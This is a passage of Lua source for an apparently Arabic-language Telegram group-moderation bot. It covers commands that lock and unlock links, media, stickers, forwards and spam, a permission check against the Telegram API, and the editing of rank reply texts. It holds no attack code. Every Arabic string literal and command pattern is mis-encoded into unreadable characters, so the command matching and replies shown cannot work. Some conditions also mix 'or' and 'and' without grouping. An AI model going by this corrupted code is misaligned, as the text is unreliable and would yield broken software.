ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูุตูุช")  
DevRio:set(Rinda..'Rio:Lock:Voice'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุตูุช ุจุงููุนู ูููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุฑูุงุจุท" then
if not DevRio:get(Rinda..'Rio:Lock:Links'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูุฑูุงุจุท")  
DevRio:set(Rinda..'Rio:Lock:Links'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุฑูุงุจุท ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูููุงูุน" then
if not DevRio:get(Rinda..'Rio:Lock:Location'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูููุงูุน")  
DevRio:set(Rinda..'Rio:Lock:Location'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูููุงูุน ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงููุนุฑู" or LockText[2] == "ุงููุนุฑูุงุช" then
if not DevRio:get(Rinda..'Rio:Lock:Tags'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงููุนุฑูุงุช")  
DevRio:set(Rinda..'Rio:Lock:Tags'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงููุนุฑูุงุช ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงููููุงุช" then
if not DevRio:get(Rinda..'Rio:Lock:Document'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงููููุงุช")  
DevRio:set(Rinda..'Rio:Lock:Document'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงููููุงุช ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงููุงุดุชุงู" or LockText[2] == "ุงูุชุงู" then
if not DevRio:get(Rinda..'Rio:Lock:Hashtak'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงููุงุดุชุงู")  
DevRio:set(Rinda..'Rio:Lock:Hashtak'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงููุงุดุชุงู ุจุงููุนู ูููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุฌูุงุช" then
if not DevRio:get(Rinda..'Rio:Lock:Contact'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูุฌูุงุช")  
DevRio:set(Rinda..'Rio:Lock:Contact'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, '๏ธโ๏ธฐุงูุฌูุงุช ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุดุจูุงุช" then
if not DevRio:get(Rinda..'Rio:Lock:WebLinks'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูุดุจูุงุช")  
DevRio:set(Rinda..'Rio:Lock:WebLinks'..msg.chat_id_,true) 
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุดุจูุงุช ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุนุฑุจูู" then
if not DevRio:get(Rinda..'Rio:Lock:Arabic'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูุนุฑุจูู")  
DevRio:set(Rinda..'Rio:Lock:Arabic'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุนุฑุจูู ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุงููููุฒูู" then
if not DevRio:get(Rinda..'Rio:Lock:English'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูุงููููุฒูู")  
DevRio:set(Rinda..'Rio:Lock:English'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุงููููุฒูู ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูููุตูุงุช" then
if not DevRio:get(Rinda..'Rio:Lock:Stickers'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูููุตูุงุช")  
DevRio:set(Rinda..'Rio:Lock:Stickers'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูููุตูุงุช ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงููุงุฑูุฏุงูู" then
if not DevRio:get(Rinda..'Rio:Lock:Markdown'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงููุงุฑูุฏุงูู")  
DevRio:set(Rinda..'Rio:Lock:Markdown'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงููุงุฑูุฏุงูู ุจุงููุนู ูููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุงุดุนุงุฑุงุช" then
if not DevRio:get(Rinda..'Rio:Lock:TagServr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูุงุดุนุงุฑุงุช")  
DevRio:set(Rinda..'Rio:Lock:TagServr'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุงุดุนุงุฑุงุช ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุชูุฌูู" then
if not DevRio:get(Rinda..'Rio:Lock:Forwards'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูุชูุฌูู")  
DevRio:set(Rinda..'Rio:Lock:Forwards'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุชูุฌูู ุจุงููุนู ูููู ูู ุงููุฌููุนู', 1, 'md')
end
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if Admin(msg) then
if text and text:match("^ูุชุญ (.*)$") and ChCheck(msg) then
local UnLockText = {string.match(text, "^(ูุชุญ) (.*)$")}
if UnLockText[2] == "ุงูุฏุฑุฏุดู" then
if DevRio:get(Rinda..'Rio:Lock:Text'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงูุฏุฑุฏุดู")  
DevRio:del(Rinda..'Rio:Lock:Text'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุฏุฑุฏุดู ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุตูุฑ" then
if DevRio:get(Rinda..'Rio:Lock:Photo'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงูุตูุฑ")  
DevRio:del(Rinda..'Rio:Lock:Photo'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุตูุฑ ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูููุงูุด" then
if DevRio:get(Rinda..'Rio:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงูููุงูุด")  
DevRio:del(Rinda..'Rio:Lock:Spam'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูููุงูุด ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุฏุฎูู" then
if DevRio:get(Rinda..'Rio:Lock:Join'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงูุฏุฎูู")  
DevRio:del(Rinda..'Rio:Lock:Join'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุฏุฎูู ุจุงููุนู ููุชูุญ ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูููุฏูู" then
if DevRio:get(Rinda..'Rio:Lock:Videos'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงูููุฏูู")  
DevRio:del(Rinda..'Rio:Lock:Videos'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูููุฏูู ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงููููุงุช" then
if DevRio:get(Rinda..'Rio:Lock:Document'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงููููุงุช")  
DevRio:del(Rinda..'Rio:Lock:Document'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงููููุงุช ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุงูููุงูู" then
if DevRio:get(Rinda..'Rio:Lock:Inline'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงูุงูููุงูู")  
DevRio:del(Rinda..'Rio:Lock:Inline'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุงูููุงูู ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงููุงุฑูุฏุงูู" then
if DevRio:get(Rinda..'Rio:Lock:Markdown'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงููุงุฑูุฏุงูู")  
DevRio:del(Rinda..'Rio:Lock:Markdown'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงููุงุฑูุฏุงูู ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงููุชุญุฑูู" then
if DevRio:get(Rinda..'Rio:Lock:Gifs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงููุชุญุฑูู")  
DevRio:del(Rinda..'Rio:Lock:Gifs'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงููุชุญุฑูู ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุงุบุงูู" then
if DevRio:get(Rinda..'Rio:Lock:Music'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงูุงุบุงูู")  
DevRio:del(Rinda..'Rio:Lock:Music'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุงุบุงูู ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุตูุช" then
if DevRio:get(Rinda..'Rio:Lock:Voice'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงูุตูุช")  
DevRio:del(Rinda..'Rio:Lock:Voice'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุตูุช ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุฑูุงุจุท" then
if DevRio:get(Rinda..'Rio:Lock:Links'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงูุฑูุงุจุท")  
DevRio:del(Rinda..'Rio:Lock:Links'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุฑูุงุจุท ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูููุงูุน" then
if DevRio:get(Rinda..'Rio:Lock:Location'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงูููุงูุน")  
DevRio:del(Rinda..'Rio:Lock:Location'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูููุงูุน ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงููุนุฑู" or UnLockText[2] == "ุงููุนุฑูุงุช" then
if DevRio:get(Rinda..'Rio:Lock:Tags'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงููุนุฑูุงุช")  
DevRio:del(Rinda..'Rio:Lock:Tags'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงููุนุฑูุงุช ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงููุงุดุชุงู" or UnLockText[2] == "ุงูุชุงู" then
if DevRio:get(Rinda..'Rio:Lock:Hashtak'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงููุงุดุชุงู")  
DevRio:del(Rinda..'Rio:Lock:Hashtak'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงููุงุดุชุงู ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุฌูุงุช" then
if DevRio:get(Rinda..'Rio:Lock:Contact'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงูุฌูุงุช")  
DevRio:del(Rinda..'Rio:Lock:Contact'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุฌูุงุช ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุดุจูุงุช" then
if DevRio:get(Rinda..'Rio:Lock:WebLinks'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงูุดุจูุงุช")  
DevRio:del(Rinda..'Rio:Lock:WebLinks'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุดุจูุงุช ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุนุฑุจูู" then
if DevRio:get(Rinda..'Rio:Lock:Arabic'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงูุนุฑุจูู")  
DevRio:del(Rinda..'Rio:Lock:Arabic'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุนุฑุจูู ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุงููููุฒูู" then
if DevRio:get(Rinda..'Rio:Lock:English'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงูุงููููุฒูู")  
DevRio:del(Rinda..'Rio:Lock:English'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุงููููุฒูู ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุงุดุนุงุฑุงุช" then
if DevRio:get(Rinda..'Rio:Lock:TagServr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงูุงุดุนุงุฑุงุช")  
DevRio:del(Rinda..'Rio:Lock:TagServr'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุงุดุนุงุฑุงุช ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูููุตูุงุช" then
if DevRio:get(Rinda..'Rio:Lock:Stickers'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงูููุตูุงุช")  
DevRio:del(Rinda..'Rio:Lock:Stickers'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูููุตูุงุช ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุชูุฌูู" then
if DevRio:get(Rinda..'Rio:Lock:Forwards'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงูุชูุฌูู")  
DevRio:del(Rinda..'Rio:Lock:Forwards'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุชูุฌูู ุจุงููุนู ููุชูุญ ูู ุงููุฌููุนู', 1, 'md')
end
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text:match("^ููู ุงูุชูููุด$") or text and text:match("^ุชูุนูู ุงูุญูุงูู ุงููุตูู$") and ChCheck(msg) then
if not Constructor(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐููููุดุฆูู ููุท', 1, 'md')
else
DevRio:set(Rinda.."Rio:Lock:Bots"..msg.chat_id_,"del") DevRio:hset(Rinda.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'Rio:Lock:Links','Rio:Lock:Contact','Rio:Lock:Forwards','Rio:Lock:Videos','Rio:Lock:Gifs','Rio:Lock:EditMsgs','Rio:Lock:Stickers','Rio:Lock:Farsi','Rio:Lock:Spam','Rio:Lock:WebLinks','Rio:Lock:Photo'}
for i,Lock in pairs(LockList) do
DevRio:set(Rinda..Lock..msg.chat_id_,true)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูุชูููุด")  
end
end
if text and text:match("^ูุชุญ ุงูุชูููุด$") and ChCheck(msg) then
if not Constructor(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐููููุดุฆูู ููุท', 1, 'md')
else
DevRio:hdel(Rinda.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
UnLockList ={'Rio:Lock:Links','Rio:Lock:Contact','Rio:Lock:Forwards','Rio:Lock:Videos','Rio:Lock:Gifs','Rio:Lock:EditMsgs','Rio:Lock:Stickers','Rio:Lock:Farsi','Rio:Lock:Spam','Rio:Lock:WebLinks','Rio:Lock:Photo'}
for i,UnLock in pairs(UnLockList) do
DevRio:del(Rinda..UnLock..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุงูุชูููุด")  
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text:match("^ููู ุงููู$") and ChCheck(msg) then
if not Constructor(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐููููุดุฆูู ููุท', 1, 'md')
else
DevRio:del(Rinda..'Rio:Lock:Fshar'..msg.chat_id_) DevRio:del(Rinda..'Rio:Lock:Taf'..msg.chat_id_) DevRio:del(Rinda..'Rio:Lock:Kfr'..msg.chat_id_) 
DevRio:set(Rinda.."Rio:Lock:Bots"..msg.chat_id_,"del") DevRio:hset(Rinda.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'Rio:Lock:EditMsgs','Rio:Lock:Farsi','Rio:Lock:TagServr','Rio:Lock:Inline','Rio:Lock:Photo','Rio:Lock:Spam','Rio:Lock:Videos','Rio:Lock:Gifs','Rio:Lock:Music','Rio:Lock:Voice','Rio:Lock:Links','Rio:Lock:Location','Rio:Lock:Tags','Rio:Lock:Stickers','Rio:Lock:Markdown','Rio:Lock:Forwards','Rio:Lock:Document','Rio:Lock:Contact','Rio:Lock:Hashtak','Rio:Lock:WebLinks'}
for i,Lock in pairs(LockList) do
DevRio:set(Rinda..Lock..msg.chat_id_,true)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุฌููุน ุงูุงูุงูุฑ")  
end
end
if text and text:match("^ูุชุญ ุงููู$") and ChCheck(msg) then
if not Constructor(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐููููุดุฆูู ููุท', 1, 'md')
else
DevRio:set(Rinda..'Rio:Lock:Fshar'..msg.chat_id_,true) DevRio:set(Rinda..'Rio:Lock:Taf'..msg.chat_id_,true) DevRio:set(Rinda..'Rio:Lock:Kfr'..msg.chat_id_,true) DevRio:hdel(Rinda.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
UnLockList ={'Rio:Lock:EditMsgs','Rio:Lock:Text','Rio:Lock:Arabic','Rio:Lock:English','Rio:Lock:Join','Rio:Lock:Bots','Rio:Lock:Farsi','Rio:Lock:FarsiBan','Rio:Lock:TagServr','Rio:Lock:Inline','Rio:Lock:Photo','Rio:Lock:Spam','Rio:Lock:Videos','Rio:Lock:Gifs','Rio:Lock:Music','Rio:Lock:Voice','Rio:Lock:Links','Rio:Lock:Location','Rio:Lock:Tags','Rio:Lock:Stickers','Rio:Lock:Markdown','Rio:Lock:Forwards','Rio:Lock:Document','Rio:Lock:Contact','Rio:Lock:Hashtak','Rio:Lock:WebLinks'}
for i,UnLock in pairs(UnLockList) do
DevRio:del(Rinda..UnLock..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ูุชุญ ุฌููุน ุงูุงูุงูุฑ")  
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if Admin(msg) then
if text and (text:match("^ุถุน ุณุจุงู (%d+)$") or text:match("^ูุถุน ุณุจุงู (%d+)$")) then
local SetSpam = text:match("ุถุน ุณุจุงู (%d+)$") or text:match("ูุถุน ุณุจุงู (%d+)$")
if tonumber(SetSpam) < 40 then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงุฎุชุฑ ุนุฏุฏ ุงูุจุฑ ูู 40 ุญุฑู ', 1, 'md')
else
DevRio:set(Rinda..'Rio:Spam:Text'..msg.chat_id_,SetSpam)
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ูุถุน ุนุฏุฏ ุงูุณุจุงู โข'..SetSpam, 1, 'md')
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if Manager(msg) then
if text == "ูุญุต" and ChCheck(msg) or text == "ูุญุต ุงูุจูุช" and ChCheck(msg) then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..Rinda)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.can_change_info == true then EDT = 'โ๏ธ' else EDT = 'โ๏ธ' end
if GetInfo.result.can_delete_messages == true then DEL = 'โ๏ธ' else DEL = 'โ๏ธ' end
if GetInfo.result.can_invite_users == true then INV = 'โ๏ธ' else INV = 'โ๏ธ' end
if GetInfo.result.can_pin_messages == true then PIN = 'โ๏ธ' else PIN = 'โ๏ธ' end
if GetInfo.result.can_restrict_members == true then BAN = 'โ๏ธ' else BAN = 'โ๏ธ' end
if GetInfo.result.can_promote_members == true then VIP = 'โ๏ธ' else VIP = 'โ๏ธ' end 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุตูุงุญูุงุช ุงูุจูุช ูู โข โค\n-----------------------------------------\nโ๏ธฐุญุฐู ุงูุฑุณุงุฆู โข '..DEL..'\nโ๏ธฐุฏุนูุฉ ุงููุณุชุฎุฏููู โข '..INV..'\nโ๏ธฐุญุธุฑ ุงููุณุชุฎุฏููู โข '..BAN..'\nโ๏ธฐุชุซุจูุช ุงูุฑุณุงุฆู โข '..PIN..'\nโ๏ธฐุชุบููุฑ ุงููุนูููุงุช โข '..EDT..'\nโ๏ธฐุงุถุงูุฉ ูุดุฑููู โข '..VIP..'\n-----------------------------------------', 1, 'md')
end end
if text and text:match("^ุชุบูุฑ ุฑุฏ ุงููุทูุฑ (.*)$") and ChCheck(msg) then
local Text = text:match("^ุชุบูุฑ ุฑุฏ ุงููุทูุฑ (.*)$") 
DevRio:set(Rinda.."Rio:SudoBot:Rd"..msg.chat_id_,Text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุชุบูุฑ ุฑุฏ ุงููุทูุฑ ุงูู โข "..Text, 1, 'md')
end
if text and text:match("^ุชุบูุฑ ุฑุฏ ููุดุฆ ุงูุงุณุงุณู (.*)$") and ChCheck(msg) then
local Text = text:match("^ุชุบูุฑ ุฑุฏ ููุดุฆ ุงูุงุณุงุณู (.*)$") 
DevRio:set(Rinda.."Rio:BasicConstructor:Rd"..msg.chat_id_,Text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุชุบูุฑ ุฑุฏ ุงูููุดุฆ ุงูุงุณุงุณู ุงูู โข "..Text, 1, 'md')
end
if text and text:match("^ุชุบูุฑ ุฑุฏ ุงูููุดุฆ (.*)$") and ChCheck(msg) then
local Text = text:match("^ุชุบูุฑ ุฑุฏ ุงูููุดุฆ (.*)$") 
DevRio:set(Rinda.."Rio:Constructor:Rd"..msg.chat_id_,Text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุชุบูุฑ ุฑุฏ ุงูููุดุฆ ุงูู โข "..Text, 1, 'md')
end
if text and text:match("^ุชุบูุฑ ุฑุฏ ุงููุฏูุฑ (.*)$") and ChCheck(msg) then
local Text = text:match("^ุชุบูุฑ ุฑุฏ ุงููุฏูุฑ (.*)$") 
DevRio:set(Rinda.."Rio:Managers:Rd"..msg.chat_id_,Text) 
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุชุบูุฑ ุฑุฏ ุงููุฏูุฑ ุงูู โข "..Text, 1, 'md')
end
if text and text:match("^ุชุบูุฑ ุฑุฏ ุงูุงุฏูู (.*)$") and ChCheck(msg) then
local Text = text:match("^ุชุบูุฑ ุฑุฏ ุงูุงุฏูู (.*)$") 
DevRio:set(Rinda.."Rio:Admins:Rd"..msg.chat_id_,Text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุชุบูุฑ ุฑุฏ ุงูุงุฏูู ุงูู โข "..Text, 1, 'md')
end
if text and text:match("^ุชุบูุฑ ุฑุฏ ุงููููุฒ (.*)$") and ChCheck(msg) then
local Text = text:match("^ุชุบูุฑ ุฑุฏ ุงููููุฒ (.*)$") 
DevRio:set(Rinda.."Rio:VipMem:Rd"..msg.chat_id_,Text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุชุบูุฑ ุฑุฏ ุงููููุฒ ุงูู โข "..Text, 1, 'md')
end
if text and text:match("^ุชุบูุฑ ุฑุฏ ุงูููุธู (.*)$") and ChCheck(msg) then
local Text = text:match("^ุชุบูุฑ ุฑุฏ ุงูููุธู (.*)$") 
DevRio:set(Rinda.."Rio:Cleaner:Rd"..msg.chat_id_,Text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุชุบูุฑ ุฑุฏ ุงูููุธู ุงูู โข "..Text, 1, 'md')
end
if text and text:match("^ุชุบูุฑ ุฑุฏ ุงูุนุถู (.*)$") and ChCheck(msg) then
local Text = text:match("^ุชุบูุฑ ุฑุฏ ุงูุนุถู (.*)$") 
DevRio:set(Rinda.."Rio:mem:Rd"..msg.chat_id_,Text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุชุบูุฑ ุฑุฏ ุงูุนุถู ุงูู โข "..Text, 1, 'md')
end
if text == "ุญุฐู ุฑุฏูุฏ ุงูุฑุชุจ" or text == "ูุณุญ ุฑุฏูุฏ ุงูุฑุชุจ" and ChCheck(msg) then
